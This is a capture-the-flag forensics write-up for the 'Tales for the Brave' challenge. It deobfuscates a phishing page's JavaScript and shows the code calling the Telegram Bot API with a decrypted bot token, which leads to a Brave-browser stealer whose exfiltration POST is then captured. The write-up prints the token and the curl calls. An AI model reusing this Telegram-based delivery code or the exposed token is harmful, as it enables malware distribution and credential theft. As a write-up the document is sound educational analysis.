---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | Tales for the Brave Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: forensics
challenge: Tales for the Brave
tags: "forensics, twh, javascript, obfuscation, api, win32pe, wireshark"
date: 2025-03-29T00:00:00+00:00
last_update: 2025-03-29T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2025</h1>


## Tales for the Brave
> Solved by thewhiteh4t


- This was an interesting one because we were given a website as the starting point
- Looking at the source code, we can see `index.js` is loaded, contents :


![](https://i.imgur.com/JCKcHuS.png)

- So the javascript is obfuscated and uses `CryptoJS`, we can use an online deobfuscator : 


![](https://i.imgur.com/XjIy88q.png)

- Another better alternative is to use debugger in the browser, using debugger is simple, just open tools, click on debugger, hit pause and submit the form and the decoded javascript is revealed : 


![](https://i.imgur.com/bLswUQG.png)

- I copied this code into a `.js` file and cloned the website as well :

```
    > cat index.html
    <!DOCTYPE html>
    <html lang="en"><head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Newsletter Signup</title>
      <link rel="stylesheet" href="index.css">
      <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
    </head>
    <body>
      <div class="newsletter">
        <div class="image-section">
          <img src="img/storytellingEldoriaMyths.png" alt="Rings">
        </div>
        <div class="form-section">
          <h1>Tales of Eldoria: Stories of Magic and Bravery for the Young and Curious</h1>
          <p>In the mystical lands of Eldoria, where dragons soar and ancient magic pulses through the air, storytelling is more than just a pastime—it's a tradition that bridges generations. Imagine a magical evening where children gather around glowing crystal orbs, listening to the mesmerizing myths and legends of Eldoria. These tales teach courage, friendship, and the magic of harmony.</p>
          <form id="newsletterForm">
            <input type="email" id="email" placeholder="Email">
                    <input type="text" id="descriptionField" placeholder="Description">
            <div class="checkbox-group">
              <p>The newsletter offers:</p>
              <label><input class="cb" id="c1" type="checkbox"> Legends of Dragons</label>
              <label><input class="cb" id="c2" type="checkbox"> Ancient Magic</label>
              <label><input class="cb" id="c3" type="checkbox"> Adventures of Heroes</label>
              <label><input class="cb" id="c4" type="checkbox"> Eldoria Myths</label>
            </div>
            <div class="buttons">
                <button type="submit" data-node-outlined="false" class="button primary">SUBMIT</button>
            </div>
          </form>
        </div>
      </div>
      <script src="./decrypted.js"></script>
    
    
    </body></html>
```

- After some inspection I noticed an interesting variable `_$_5975` and how it was used :

```
    function f(oferkfer, icd) { const channel_id = -1002496072246; var enc_token = _$_5975\\[0]; if (oferkfer === G(_$_5975[1]) && CryptoJS[_$_5975[7]\](sequence[_$_5975[6]](_$_5975[5]))\[_$_5975[4]\](CryptoJS[_$_5975[3]\][_$_5975[2]]) === _$_5975\\[8]) { var decrypted = CryptoJS[_$_5975[12]\][_$_5975[11]\](enc_token, CryptoJS\[_$_5975[3]\][_$_5975[9]]\[_$_5975[10]](oferkfer), { drop: 192 })\[_$_5975[4]\](CryptoJS[_$_5975[3]\][_$_5975[9]]); var HOST = _$_5975\\[13] + String[_$_5975[14]\](0x2f) + String\[_$_5975[14]\](0x62) + String\[_$_5975[14]\](0x6f) + String\[_$_5975[14]\](0x74) + decrypted; var xhr = new XMLHttpRequest(); xhr\[_$_5975[15]] = function () { if (xhr[_$_5975[16]] == XMLHttpRequest[_$_5975[17]]) { const resp = JSON[_$_5975[10]\](xhr[_$_5975[18]]); try { const link = resp\[_$_5975[20]\][_$_5975[19]]; window\[_$_5975[23]\][_$_5975[22]\](link) } catch (error) { alert(_$_5975\[24]) } } }; xhr[_$_5975[29]\](_$_5975[25], HOST + String[_$_5975[14]](0x2f) + _$_5975\[26] + icd + _$_5975[27] + channel_id + _$_5975[28]); xhr[_$_5975[30]\](null) } else { alert(_$_5975[24]) } }
```

- Its an array and multiple items from the array were being used, so I decided to print the array, by adding a small loop : 

```
    for (var i = 0; i < 31; i++) {
      console.log(i, _$_5975[i])
    }
```

![](https://i.imgur.com/saOoRYc.png)

- As we can see, some encoded strings, parts of a URL, telegram and most importantly `RC4Drop` which is a type of cipher available in `CryptoJS`
- After this I substituted the values according to array index and ended up with the following :

```
    if (oferkfer === G('s3cur3k3y') && CryptoJS.SHA256(sequence.join('')).toString(CryptoJS.enc.Base64) === '18m0oThLAr5NfLP4hTycCGf0BIu0dG+P/1xvnW6O29g=') {
            var decrypted = CryptoJS.RC4Drop.decrypt(enc_token, CryptoJS.enc.Utf8.parse(oferkfer), {
                drop: 192
            }).toString(CryptoJS.enc.Utf8);
            var HOST = 'https://api.telegram.org' + String.fromCharCode(0x2f) + String.fromCharCode(0x62) + String.fromCharCode(0x6f) + String.fromCharCode(0x74) + decrypted;
    
            var xhr = new XMLHttpRequest();
            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    const resp = JSON.parse(xhr.responseText);
                    try {
                        const link = resp.result.text;
                        window.location.replace(link)
                    } catch (error) {
                        alert('Form submitted!')
                    }
                }
            };
            console.log('GET', HOST + String.fromCharCode(0x2f) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5')
            xhr.open('GET', HOST + String.fromCharCode(0x2f) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5');
            //xhr.send(null)
        } else {
            alert('Form submitted!')
        }
```

- Decryption block is executed if the condition is satisfied : 

```
    oferker -> email before @tld
    G('s3cur3k3y') -> 0p3r4t10n_4PT_Un10n
```

- So the email to satisfy the condition should be `0p3r4t10n_4PT_Un10n@abc.com` but since the script is running locally we can simply bypass the conditions
- In the end the code block sends a GET request so I inspected the URL : 

```
    console.log('GET', HOST + String.fromCharCode(0x2f) + 'forwardMessage?chat_id=' + icd + '&from_chat_id=' + channel_id + '&message_id=5')
    
    GET https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/forwardMessage?chat_id=NaN&from_chat_id=-1002496072246&message_id=5 decrypted.js:128:17
```

- So the telegram API is being called and we get the following things : 

```
    Bot ID : bot7767830636
    Bot token : AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc
    chat_id : Null
    from_chat_id : -1002496072246
    message_id : 5
```

- `forwardMessage` does exactly what the name suggests, it will forward a message from one chat to another, but some requirements need to be fulfilled for this to happen : 

```
    Bot should be present on both chats
```

- But in the URL we can see that `chat_id` is missing, so we will make our own by creating a `group` in telegram and then we can add the bot to our group
- But we don’t know the name of the bot, to solve this there is another endpoint we can call : 

```
    > curl -s 'https://api.telegram.org/bot7767830636:AAF5Fej3DZ44ZZQbMrkn8gf7dQdYb3eNxbc/getMe' | json_pp
    
    {
       "ok" : true,
       "result" : {
          "can_connect_to_business" : false,
          "can_join_groups" : true,
          "can_read_all_group_messages" : false,
          "first_name" : "OperationEldoriaBot",
          "has_main_web_app" : false,
          "id" : 7767830636,
          "is_bot" : true,
          "supports_inline_queries" : false,
          "username" : "OperationEldoriaBot"
       }
    }
```

- After adding the bot to our group we can iterate from message IDs `1 - 10` to get all the messages : 


![](https://i.imgur.com/1b1xrhh.png)



- We got a zip file which contains a tool that targets Brave browser, inside the zip is a windows PE file
- Time for dynamic analysis, after using `Process Explorer, Process Monitor` etc I finally checked `WireShark` for network activity because a browser stealer is expected to send the information
- And a single DNS query popped up : `z0lsc2S65u.htb` which obviously does not exists
- So I did the following :

```
    Added the domain in windows Hosts file
    Started a PHP server on my other box on port 31337 as seen in wireshark
    Launched Brave.exe again
```

![](https://i.imgur.com/Iaaj6RH.png)



- And we get a POST request to our server


![](https://i.imgur.com/LTALsWD.png)



- JSON data was being sent but more interestingly there was an `Authorization` header with JWT :


![](https://i.imgur.com/vTH0E4n.png)

- Double base64 encoded flag : 

```
    HTB{APT_c0nsp1r4c13s_b3h1nd_b3n1gn_l00k1ng_s1t3s}
```
